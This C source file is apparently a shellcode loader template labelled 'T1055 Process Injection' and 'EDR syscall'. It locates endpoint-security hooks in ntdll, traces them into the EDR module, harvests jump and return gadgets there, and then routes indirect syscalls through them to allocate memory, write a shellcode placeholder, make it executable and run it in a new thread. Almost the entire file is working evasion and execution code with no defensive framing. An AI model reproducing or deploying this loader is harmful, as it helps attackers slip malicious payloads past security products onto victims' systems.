/**
Editor: Thomas X Meng
T1055 Process Injection
EDR syscall (SPS version)
EDR syscall no.1

_NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x18
    mov r11, qword [rel sysAddrNtAllocateVirtualMemory]
    mov r12, [rel edrJumpAddressR11_15]
    jmp r12

TODO: add halo's gate support for finding syscall SSN
**/


#include <windows.h>  // Include the Windows API header
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <stdint.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")


// The type NTSTATUS is typically defined in the Windows headers as a long.
typedef long NTSTATUS;  // Define NTSTATUS as a long

// --- Function pointer typedefs for NT syscalls ---
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);


typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// --- These will point to the syscall trampoline addresses ---
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;
UINT_PTR sysAddrNtProtectVirtualMemory;
UINT_PTR edrJumpAddressR11_15 = 0;
UINT_PTR edrRetAddr = 0;


// --- These are used to extract the syscall trampoline addresses ---
NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
NtWriteVirtualMemory_t NtWriteVirtualMemory;
NtCreateThreadEx_t NtCreateThreadEx;
NtProtectVirtualMemory_t NtProtectVirtualMemory;
NtWaitForSingleObject_t pNtWaitForSingleObject;

#define MAX_HOOKED 16

typedef struct {
    const char* hooked_apis[MAX_HOOKED];
    UINT_PTR Hook_target_address[MAX_HOOKED];
    UINT_PTR syscall_redirect_addr[MAX_HOOKED];
    UINT_PTR edr_jmp_address[MAX_HOOKED];
    UINT_PTR edr_ret_address[MAX_HOOKED];
    int count;
} HookTracking;


HookTracking g_hooks = { 0 };

PVOID DLLViaPEB(wchar_t* DllNameToSearch);
void* GetFunctionAddress(const char* MyNtdllFunction, PVOID MyDLLBaseAddress);

BOOL MatchSyscallPattern(BYTE* region, SIZE_T size, UINT_PTR* matchAddr, int indexToMatch) {
    int foundCount = 0;
    for (SIZE_T i = 0; i < size - 16; i++) {
        if (region[i] == 0xB8 &&
            region[i + 5] == 0xFF && region[i + 6] == 0x25 &&
            *(DWORD*)&region[i + 7] == 0x00000000) {

            if (foundCount == indexToMatch) {
                *matchAddr = (UINT_PTR)&region[i + 5];

                printf("[+] Found syscall stub pattern at offset 0x%zx", i);
                printf("    Bytes: ");
                for (int j = 0; j < 14; j++) {
                    printf("%02X ", region[i + j]);
                }
                printf("");

                UINT_PTR* targetAddrPtr = (UINT_PTR*)&region[i + 11];
                UINT_PTR absTarget = *targetAddrPtr;

                printf("    Assembly:");
                printf("        mov eax, 0x%08X", *(DWORD*)&region[i + 1]);
                printf("        jmp qword ptr [rip + 0x0] ; RIP=0x%p\n", (void*)(*matchAddr + 5));
                printf("        qword ptr content (target address): 0x%p\n", (void*)absTarget);
                return TRUE;
            }
            foundCount++;
        }
    }
    return FALSE;
}

void PrintHookRegionInfo(uintptr_t jmpTarget) {
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if (VirtualQuery((LPCVOID)jmpTarget, &mbi, sizeof(mbi))) {
        DWORD p = mbi.Protect & 0xFF;
        if ((mbi.Type == MEM_PRIVATE) && (p == PAGE_EXECUTE_READ)) {
            printf("    [MEMORY BASE] 0x%p | EXECUTE_READ | PRIVATE\n", mbi.BaseAddress);
        } else {
            printf("    [MEMORY BASE] 0x%p | REJECTED | Prot: 0x%lx | Type: 0x%lx\n",
                   mbi.BaseAddress, mbi.Protect, mbi.Type);
        }
    } else {
        printf("    [MEMORY] VirtualQuery FAILED at 0x%p\n", (void*)jmpTarget);
    }
}



static HMODULE g_edrModule = NULL;
static const char* g_edrName = NULL;



/* We find the jmp r11 - r15 stubs, r10 is used by syscall.*/
void ScanEDRJumpStubs(HMODULE edrModule, int hookIndex) {
    if (!edrModule || hookIndex >= MAX_HOOKED) return;

    printf("[*] Scanning EDR module at: %p for jump stubs (r11-r15)\r\n", edrModule);

    BYTE* base = (BYTE*)edrModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            BYTE* sectionStart = base + sec->VirtualAddress;
            DWORD sectionSize = sec->Misc.VirtualSize;
            bool FoundJmpRet = NULL;

            for (DWORD j = 0; j < sectionSize - 3; j++) {

                if(!g_hooks.edr_jmp_address[hookIndex]) {

                    if (sectionStart[j] == 0x41 && sectionStart[j + 1] == 0xFF &&
                        sectionStart[j + 2] >= 0xE3 && sectionStart[j + 2] <= 0xE7) {

                        int regIndex = sectionStart[j + 2] - 0xD8;


                        printf("[+] Found jump stub: jmp r%d at address: 0x%p\n", regIndex, sectionStart + j);
                        g_hooks.edr_jmp_address[hookIndex] = (UINT_PTR)(sectionStart + j);
                        // return;
                    }

                }

                if(!g_hooks.edr_ret_address[hookIndex]) {
                    // Look for RET + INT3 padding: C3 CC CC CC CC
                    if (sectionStart[j]     == 0xC3 &&
                        sectionStart[j + 1] == 0xCC &&
                        sectionStart[j + 2] == 0xCC &&
                        sectionStart[j + 3] == 0xCC &&
                        sectionStart[j + 4] == 0xCC) {

                        g_hooks.edr_ret_address[hookIndex] = (UINT_PTR)(sectionStart + j);
                        printf("[+] Found padded RET stub at address: 0x%p\n", sectionStart + j);
                        // return;
                    }
                }

                if(g_hooks.edr_ret_address[hookIndex] && g_hooks.edr_jmp_address[hookIndex]) {
                    FoundJmpRet = true;
                    return;
                }
            }

            printf("[-] No jmp r11-r15 found in .text section\r\n");
            return;
        }
    }
    printf("[-] .text section not found in module\r\n");
}



const char* TraceUntilEDR(uintptr_t startAddress, HMODULE* outResolvedModule) {
    int maxDepth = 5;
    uintptr_t currentAddr = startAddress;

    static HMODULE cachedEDRMod = NULL;
    static char cachedEDRName[MAX_PATH] = {0};

    if (cachedEDRMod) {
        if (outResolvedModule) *outResolvedModule = cachedEDRMod;
        return cachedEDRName;
    }

    for (int i = 0; i < maxDepth; ++i) {
        printf("[+] Tracing from 0x%p with region info: \n", (void*)currentAddr);
        PrintHookRegionInfo(currentAddr);

        for (int offset = 0; offset < 300; ++offset) {
            BYTE* p = (BYTE*)(currentAddr + offset);

            // FF 15 ?? ?? ?? ?? or FF 25 ?? ?? ?? ??
            if (p[0] == 0xFF && (p[1] == 0x15 || p[1] == 0x25)) {
                int32_t rel = *(int32_t*)(p + 2);
                uintptr_t rip = (uintptr_t)(p + 6);
                uintptr_t ptrToTarget = rip + rel;

                if (IsBadReadPtr((void*)ptrToTarget, sizeof(uintptr_t))) {
                    printf("[-] Bad pointer to target at 0x%p", (void*)ptrToTarget);
                    return "BAD_POINTER";
                }

                uintptr_t target = *(uintptr_t*)ptrToTarget;
                printf("[+] Actual control transfer target = 0x%p \n", (void*)target);

                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQuery((LPCVOID)target, &mbi, sizeof(mbi)) == 0) {
                    printf("[-] VirtualQuery failed on 0x%p", (void*)target);
                    return "INVALID_QUERY";
                }

                HMODULE mod = NULL;
                if (GetModuleHandleExA(
                        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                        (LPCSTR)target, &mod) && mod) {
                    cachedEDRMod = mod;
                    if (outResolvedModule) *outResolvedModule = mod;
                    GetModuleBaseNameA(GetCurrentProcess(), mod, cachedEDRName, sizeof(cachedEDRName));
                    printf("[!] Reached module: %s \n", cachedEDRName);
                    return cachedEDRName;
                }

                currentAddr = target;
                break;
            }
        }
    }

    return "UNKNOWN";
}


const char* IdentifySyscallFromNtdll(UINT_PTR absAddress, PVOID ntdllBase) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdllBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdllBase + dos->e_lfanew);
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdllBase + exportRVA);
    DWORD* names = (DWORD*)((BYTE*)ntdllBase + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)ntdllBase + exp->AddressOfFunctions);
    WORD* ords = (WORD*)((BYTE*)ntdllBase + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        UINT_PTR funcVA = (UINT_PTR)((BYTE*)ntdllBase + funcs[ords[i]]);
        if (absAddress >= funcVA && absAddress < funcVA + 32) {
            return (char*)ntdllBase + names[i];
        }
    }
    return "UNKNOWN";
}


UINT_PTR FindSyscallTrampoline(const char* apiName) {
    if (g_hooks.count >= MAX_HOOKED)
        return 0;


	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    wchar_t wideLibName[32] = {0};

    for (int i = 0; libName[i] != 0; i++) {
        wideLibName[i] = (wchar_t)libName[i];
    }
    PVOID ntdllBase =  (PVOID)DLLViaPEB(wideLibName);
    
    if (!ntdllBase)
        return 0;

    BYTE* funcAddr = (BYTE*)GetFunctionAddress(apiName, ntdllBase);
    if (!funcAddr)
        return 0;

    if (funcAddr[0] == 0xE9) {
        int32_t relOffset = *(int32_t*)(funcAddr + 1);
        BYTE* jmpTarget = funcAddr + 5 + relOffset;

        // check the jmp target is of RX permission and is private memory region, thus confirm it has been injected into
        // our process. It should be initialised as RWX by some EDRs and later changed to RX by syscall from EDR. 
        printf("[+] Found jmp target at: 0x%p with region info: ", (void*)jmpTarget);
        PrintHookRegionInfo((uintptr_t)jmpTarget);
        
        if (!g_edrName) {
            g_edrName = TraceUntilEDR((uintptr_t)jmpTarget, &g_edrModule);
        }  

        if (g_edrModule && strcmp(g_edrName, "UNKNOWN") != 0) {
            printf("[+] Traced hook path to: %s \n", g_edrName);
            ScanEDRJumpStubs(g_edrModule, g_hooks.count);
        }


        MEMORY_BASIC_INFORMATION mbi = { 0 };
        if (!VirtualQuery((LPCVOID)jmpTarget, &mbi, sizeof(mbi)))
            return 0;

        if (mbi.Type == MEM_PRIVATE && (mbi.Protect & PAGE_EXECUTE_READ)) {
            UINT_PTR matchAddr = 0;
            int attempt = g_hooks.count;

            if (!MatchSyscallPattern((BYTE*)mbi.BaseAddress, mbi.RegionSize, &matchAddr, attempt)) {
                if (!MatchSyscallPattern((BYTE*)mbi.BaseAddress, mbi.RegionSize, &matchAddr, 0)) {
                    return 0;
                }
            }

            UINT_PTR ptrToAbs = *(UINT_PTR*)(matchAddr + 6);
            const char* resolved = IdentifySyscallFromNtdll(ptrToAbs, ntdllBase);

            printf("[+] Hooked API: %s\n", apiName);
            printf("[+] JMP Target Region: 0x%p\n", mbi.BaseAddress);
            printf("[+] Syscall Stub Addr: 0x%p\n", (void*)matchAddr);
            printf("[+] Absolute Syscall Instruction Addr: 0x%p --> %s\n", (void*)ptrToAbs, resolved);

            g_hooks.hooked_apis[g_hooks.count] = apiName;
            g_hooks.Hook_target_address[g_hooks.count] = (UINT_PTR)jmpTarget;
            g_hooks.syscall_redirect_addr[g_hooks.count] = matchAddr;
            g_hooks.count++;
            return matchAddr;
        }
    }

    for (int i = 0; i < g_hooks.count; ++i) {
        if (strcmp(g_hooks.hooked_apis[i], apiName) == 0) {
            return g_hooks.syscall_redirect_addr[i];
        }
    }

    return 0;
}



void* DLLViaPEB(wchar_t* DllNameToSearch) {
#ifdef _M_X64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
    PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &pPEB->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)current - sizeof(LIST_ENTRY));
        if (wcsstr(entry->FullDllName.Buffer, DllNameToSearch))
            return entry->DllBase;
        current = current->Flink;
    }
    return NULL;
}

void* GetFunctionAddress(const char* funcName, PVOID dllBase) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dllBase + dos->e_lfanew);
    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBase + expDirRVA);

    DWORD* names = (DWORD*)((BYTE*)dllBase + expDir->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)dllBase + expDir->AddressOfFunctions);
    WORD* ords = (WORD*)((BYTE*)dllBase + expDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        const char* name = (char*)dllBase + names[i];
        if (strcmp(name, funcName) == 0) {
            DWORD funcRVA = funcs[ords[i]];
            return (BYTE*)dllBase + funcRVA;
        }
    }
    return NULL;
}




// --- Externs from NASM file: indirect_syscall.asm ---
#ifdef __cplusplus
extern "C" {
#endif

extern void _NtAllocateVirtualMemory_stub(void);
extern void _NtWriteVirtualMemory_stub(void);
extern void _NtCreateThreadEx_stub(void);
extern void _NtWaitForSingleObject_stub(void);
extern void _NtProtectVirtualMemory_stub(void);

#ifdef __cplusplus
}
#endif


unsigned char magiccode[] = ####SHELLCODE####;



int main(int argc, char *argv[]) {


    PVOID allocBuffer = NULL;   
    SIZE_T buffSize = sizeof(magiccode);   
    SIZE_T regionSize = buffSize;


    // Get a handle to the ntdll.dll library
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");///
    if (hNtdll == NULL) {
        printf("[-] Error: ntdll could not be found.");
        return 1; 
    }     


    printf("[!] EDR syscall-1 loader started.\n");

    // Dynamically resolve NT functions
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !pNtWaitForSingleObject) {
        printf("[-] Error: Failed to resolve one or more Nt* functions.\n");
        return 1;
    }

    // Calculate syscall trampoline addresses    
    // sysAddrNtAllocateVirtualMemory = (UINT_PTR)NtAllocateVirtualMemory + 0x12;
    sysAddrNtAllocateVirtualMemory = FindSyscallTrampoline("NtAllocateVirtualMemory");
    edrJumpAddressR11_15 = g_hooks.edr_jmp_address[0];
    printf("[+] EDR jump address: 0x%p\n", (void*)edrJumpAddressR11_15);
    edrRetAddr = g_hooks.edr_ret_address[0];
    printf("[+] EDR ret address: 0x%p\n", (void*)edrRetAddr);

    // sysAddrNtWriteVirtualMemory = (UINT_PTR)NtWriteVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = FindSyscallTrampoline("NtWriteVirtualMemory");
    sysAddrNtProtectVirtualMemory = FindSyscallTrampoline("NtProtectVirtualMemory");
    sysAddrNtCreateThreadEx = (UINT_PTR)NtCreateThreadEx + 0x12;
    // sysAddrNtCreateThreadEx = FindSyscallTrampoline("NtCreateThreadEx");
    sysAddrNtWaitForSingleObject = (UINT_PTR)pNtWaitForSingleObject + 0x12;



    // Call NASM syscall stubs
    NTSTATUS status = ((NtAllocateVirtualMemory_t)_NtAllocateVirtualMemory_stub)(
        (HANDLE)-1,
        (PVOID*)&allocBuffer,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", allocBuffer);

 



    // -------------------------------------------------------

    ULONG bytesWritten = 0;
    printf("[+] Writing magiccode via NtWriteVirtualMemory...\n");

    status = ((NtWriteVirtualMemory_t)_NtWriteVirtualMemory_stub)(
        GetCurrentProcess(),
        allocBuffer,
        magiccode,
        sizeof(magiccode),
        &bytesWritten
    );

    if (status != 0 || bytesWritten != sizeof(magiccode)) {
        printf("[-] NtWriteVirtualMemory failed. NTSTATUS: 0x%lx, Bytes Written: %lu\n", status, bytesWritten);
        return 1;
    }
    printf("[+] Wrote %lu bytes to allocated memory\n", bytesWritten);


    printf("[+] Magiccode is located at: %p\n", allocBuffer);
    printf("[+] Press any key to continue...\n");
    getchar();

    // -------------------------------------------------------


    ULONG oldProtect = 0;

    NTSTATUS statusProtect = ((NtProtectVirtualMemory_t)_NtProtectVirtualMemory_stub)(
        (HANDLE)-1,              
        (PVOID*)&allocBuffer,      
        &buffSize,                
        PAGE_EXECUTE_READ,        
        &oldProtect               
    );


    if(statusProtect != 0) {
        printf("[-] NtProtectVirtualMemory failed with NTSTATUS: 0x%lx\n", statusProtect);
        return 1;
    } else {
        printf("[+] Memory protection changed to PAGE_EXECUTE_READ\n");
    }


    // -------------------------------------------------------


    HANDLE hThread = NULL;
    printf("[+] Creating remote thread via NtCreateThreadEx...\n");

    status = ((NtCreateThreadEx_t)_NtCreateThreadEx_stub)(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        GetCurrentProcess(),
        (PVOID)(uintptr_t)allocBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0 || hThread == NULL) {
        printf("[-] NtCreateThreadEx failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread created successfully. Handle: %p\n", hThread);

    // -------------------------------------------------------

    printf("[+] Waiting for thread to complete via NtWaitForSingleObject...\n");

    status = ((NtWaitForSingleObject_t)_NtWaitForSingleObject_stub)(
        hThread,
        FALSE,
        NULL
    );

    if (status != 0) {
        printf("[-] NtWaitForSingleObject failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread has finished execution.\n");
    return 0;

}

